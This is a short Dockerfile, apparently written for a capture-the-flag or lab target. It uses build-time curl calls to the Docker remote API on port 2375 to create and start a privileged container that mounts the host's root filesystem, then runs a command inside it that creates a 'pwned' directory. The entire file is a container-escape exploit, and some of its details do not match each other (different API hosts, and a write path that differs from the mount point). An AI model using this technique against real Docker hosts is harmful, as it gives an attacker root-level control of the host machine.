FROM alpine:latest

RUN apk add --no-cache curl jq

RUN curl -X POST -H "Content-Type: application/json" -d '{"image": "alpine","Tty":true,"OpenStdin":true,"Privileged":true,"AutoRemove":true,"HostConfig":{"NetworkMode":"host","Binds":["/:/flag"]}}' http://localhost:2375/containers/create?name=shell
RUN curl -X POST http://host.docker.internal:2375/containers/shell/start
RUN exec_id=$(curl -s -X POST -H "Content-Type: application/json" -d '{"AttachStdin":false,"AttachStdout":true,"AttachStderr":true, "Tty":false, "Cmd":["mkdir", "/mnt/tmp/pwned"]}' http://host.docker.internal:2375/containers/shell/exec | jq -r .Id) && curl -X POST "http://host.docker.internal:2375/exec/$exec_id/start" -H "Content-Type: application/json" -d '{"Detach": false, "Tty": false}'
